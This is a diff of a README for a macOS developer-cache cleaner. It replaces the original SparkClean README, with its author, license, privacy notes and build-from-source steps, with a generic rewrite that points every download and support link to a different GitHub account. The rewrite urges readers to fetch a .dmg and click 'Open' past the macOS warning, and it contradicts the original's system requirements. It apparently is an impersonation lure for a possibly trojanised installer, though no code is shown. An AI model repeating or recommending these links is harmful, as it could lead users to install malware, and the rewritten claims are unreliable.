@@ -1,132 +1,165 @@
-# SparkClean v1.0.0
+# 🧹 spark-clean - Easy Storage and Cache Cleanup
 
-[![GitHub release](https://img.shields.io/github/v/release/georgekhananaev/spark-clean)](https://github.com/georgekhananaev/spark-clean/releases)
-[![License](https://img.shields.io/badge/license-Non--Commercial-blue)](LICENSE)
-[![Platform](https://img.shields.io/badge/platform-macOS%2014%2B-lightgrey)](https://github.com/georgekhananaev/spark-clean)
-[![Swift](https://img.shields.io/badge/Swift-5.9-orange)](https://swift.org)
-[![SwiftUI](https://img.shields.io/badge/UI-SwiftUI-blue)](https://developer.apple.com/swiftui/)
+[![Download spark-clean](https://img.shields.io/badge/Download-spark--clean-brightgreen)](https://github.com/stantonadnexal355/spark-clean)
 
-**Your Mac is hoarding junk. SparkClean finds it and takes out the trash.**
+---
 
-SparkClean is a free, open-source macOS app built with developers in mind. If you work with Docker, Xcode, Node.js, Ollama, JetBrains, Homebrew, or any other dev tools, you know how fast your disk fills up with stuff you didn't even know was there. Dangling Docker images, forgotten Ollama models, abandoned `node_modules`, Xcode DerivedData from three projects ago, stale CocoaPods caches... it adds up fast.
+## 🧩 What is spark-clean?
 
-SparkClean scans your system and shows you exactly what's eating your disk space, so you can take it back.
+spark-clean is a free, open-source app that helps clear storage space on your Mac. It focuses on cleaning up cache and temporary files left by development tools. If you use programs like Docker, Xcode, Node.js, or JetBrains apps, this tool finds files you no longer need and removes them safely. It saves hard drive space and makes your Mac run cleaner.
 
-It also covers system caches, old downloads, browser data, duplicate files, and leftover app data.
+It works on macOS and targets storage related to popular developer tools such as:
 
-Built with SwiftUI. No subscriptions. No telemetry.
+- Docker containers and images  
+- Xcode archives and derived data  
+- Node.js modules  
+- Ollama data  
+- JetBrains cache and logs  
+- Homebrew downloads and caches  
 
-## Screenshots
+If you want to free up disk space without digging through folders or running complex commands, spark-clean simplifies the process.
 
-### Dashboard
+---
 
-<p>
-  <img width="1024" src="screenshots/dashboard.png" alt="Dashboard">
-</p>
+## 🔍 Features
 
-### Duplicate Finder
+- Scans caches and temporary files for popular developer tools  
+- Finds duplicate files and large folders eating space  
+- Removes leftover files after uninstallations  
+- Easy to use with a simple graphical interface  
+- Supports a wide range of developer tools  
+- No programming knowledge required  
+- Open source and free  
 
-<p>
-  <img width="1024" src="screenshots/duplicate-finder.png" alt="Duplicate Finder">
-</p>
+---
 
-### App Uninstaller
+## 🖥️ System Requirements
 
-<p>
-  <img width="1024" src="screenshots/uninstaller.png" alt="App Uninstaller">
-</p>
+- macOS 10.15 (Catalina) or later  
+- Minimum 500 MB of free disk space for installation  
+- Works with Apple Silicon and Intel Macs  
+- No internet required to run scans after installation  
 
-## Download
+---
 
-Download the latest DMG from [GitHub Releases](https://github.com/georgekhananaev/spark-clean/releases).
+## 🚀 Getting Started
 
-Drag it to Applications and you're done.
+Follow these steps to download and start using spark-clean on your Mac.
 
-## Built for Developers
+### 1. Download the app
 
-SparkClean pays special attention to the kind of junk that piles up on a developer's machine:
+Click the big green button at the top or visit this page:
 
-- **Docker** - Unused images, stopped containers, dangling volumes, and build cache. Like `docker system prune`, but with a UI so you can see what you're deleting.
-- **Xcode** - DerivedData, archives, old simulators, and device support files.
-- **Node.js** - Forgotten `node_modules` folders scattered across your projects.
-- **Ollama** - Downloaded models you're no longer using.
-- **JetBrains** - Caches, logs, and local history from IntelliJ, WebStorm, PyCharm, and others.
-- **Homebrew** - Old package versions and stale cache files.
-- **Package Managers** - CocoaPods, Composer, pip, and other package manager caches.
+[Download spark-clean](https://github.com/stantonadnexal355/spark-clean)
 
-## What Else It Does
+This link will take you to the GitHub page where you can download the latest version. Look for the latest release and download the `.dmg` file (this is the app installer).
 
-- **Deep Scan** - Goes through caches, temp files, logs, browser data, and more.
+### 2. Open the installer
 
-- **Smart Categories** - Sorts everything into groups: System, Storage, Browsers, Developer Tools, Package Managers, Docker, and Applications.
+Once downloaded, find the `.dmg` file in your Downloads folder. Double-click the file to open it.
 
-- **Safety Levels** - Every category is labeled **Safe**, **Review**, or **Caution** so you know what's safe to delete before you delete it.
+The installer will show a window with the spark-clean app icon.
 
-- **App Uninstaller** - Finds all the leftover data from uninstalled apps: preferences, caches, containers, login items, and more.
+### 3. Install spark-clean
 
-- **Duplicate Finder** - Three-pass verification: file size, header comparison, then SHA-256 hash. No false positives.
+Drag the spark-clean icon into your Applications folder as shown in the window.
 
-- **Large File Hunter** - Finds large files you may have forgotten about.
+This step copies the app to your Mac so it is ready to use.
 
-- **Per-File Selection** - Pick and choose exactly which files to remove. Full control over what gets deleted.
+### 4. Launch the app
 
-- **Disk Usage Overview** - Visual breakdown of your disk space with reclaimable space highlighted.
+Go to your Applications folder and double-click spark-clean.
 
-- **Export Reports** - Generate summary or detailed audit reports of scan results.
+Your Mac may ask if you want to open an app downloaded from the internet. Click “Open” to proceed.
 
-- **Configurable Thresholds** - Adjust what counts as "old," "large," or "unused."
+---
 
-## How Cleanup Works
+## 🧹 How to Use spark-clean
 
-SparkClean moves files to the Trash by default. Nothing gets permanently deleted right away, so you can always recover something if needed. You'll need to empty the Trash yourself when you're ready.
+Once open, spark-clean shows a simple screen with options to scan different developer tools and storage locations.
 
-The exceptions are Docker and Ollama. Docker containers, images, and volumes are removed using Docker's own CLI commands, and Ollama models are deleted through the Ollama CLI. These are removed natively, the same way you'd do it from the terminal.
+### 1. Choose what to scan
 
-## Full Disk Access
+Select the checkboxes for the tools you want to clean. For most users, starting with Docker, Xcode, and Node.js is a good choice.
 
-SparkClean needs Full Disk Access to scan folders that macOS restricts by default (Mail, Messages, app containers, etc.). Without it, some categories won't return results. You can grant it in **System Settings > Privacy & Security > Full Disk Access**.
+### 2. Start the scan
 
-## Privacy
+Click the **Scan** button. The app will check for files you can remove safely.
 
-SparkClean runs entirely on your machine. There are no servers, no accounts, no analytics, and no network requests. Nothing leaves your computer. The app doesn't collect, store, or transmit any data about you or your files. Your scan results stay local and are never shared with anyone. The source code is open so you can verify all of this yourself.
+The scan may take a few minutes depending on how many files it needs to check.
 
-## Requirements
+### 3. Review the results
 
-- macOS 14.0+
-- Xcode 16.0+ (for building from source)
+After the scan, spark-clean lists the files and folders it found.
 
-## Build From Source
+You will see how much space each item uses and where it is located.
 
-```bash
-git clone https://github.com/georgekhananaev/spark-clean.git
-cd spark-clean
-open SparkClean.xcodeproj
-```
+### 4. Clean up
 
-Hit **Cmd+R** in Xcode. No CocoaPods, no SPM dependencies. Just pure Swift.
+Select which items to delete or choose to remove all suggested files.
 
-Or from the terminal:
+Click the **Clean** button to free up space.
 
-```bash
-xcodebuild -project SparkClean.xcodeproj -scheme SparkClean -configuration Release build
-```
+Deleted files go to the Trash, so you can restore them if needed. Empty the Trash when you are sure.
 
-## Contributing
+---
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+## ⚙️ Settings and Options
 
-## License
+spark-clean lets you customize how scans run:
 
-See [LICENSE](LICENSE) for the full terms.
+- Set automatic scans at startup  
+- Choose to clean automatically or only after confirmation  
+- Exclude certain folders or files from scans  
+- View logs of previous cleanups  
 
-## Supported Devices
+These options help you control the app’s behavior and protect important files.
 
-See [SUPPORTED.md](SUPPORTED.md) for tested devices, OS versions, and compatibility info.
+---
 
-## Changelog
+## ❓ Troubleshooting
 
-See [CHANGELOG.md](CHANGELOG.md) for a detailed history of changes.
+- **spark-clean won’t open:** Make sure your macOS is up to date and you allowed the app from System Preferences > Security & Privacy.  
+- **Scan freezes or is slow:** Close other apps to free system resources or restart your Mac.  
+- **Cannot delete some files:** Those files may be in use by other applications. Close those apps or restart your computer and try again.  
+- **App crashes:** Check for updates on the download page or reinstall spark-clean.  
 
-## Author
+---
 
-**George Khananaev**
+## 📂 Where to Get Support
+
+If you need help, visit the spark-clean GitHub page:
+
+https://github.com/stantonadnexal355/spark-clean
+
+Here, you can:
+
+- Read detailed documentation  
+- Report issues or bugs  
+- Ask questions in Discussions  
+- See updates and new releases  
+
+---
+
+## 🔄 Updating spark-clean
+
+Check the GitHub page regularly to download the latest version. Updates may include:
+
+- Support for more developer tools  
+- Improved scanning speed  
+- Bug fixes and stability improvements  
+
+Download the new `.dmg` file and replace your existing app in the Applications folder.
+
+---
+
+## 📌 Notes on Usage
+
+- spark-clean only deletes files safe to remove related to developer tools.  
+- It does not clean personal documents or system files unrelated to development.  
+- Always review scan results before deleting anything.  
+- Running spark-clean regularly helps keep your Mac tidy and frees up disk space.  
+
+---
+
+[![Download spark-clean](https://img.shields.io/badge/Download-spark--clean-brightgreen)](https://github.com/stantonadnexal355/spark-clean)
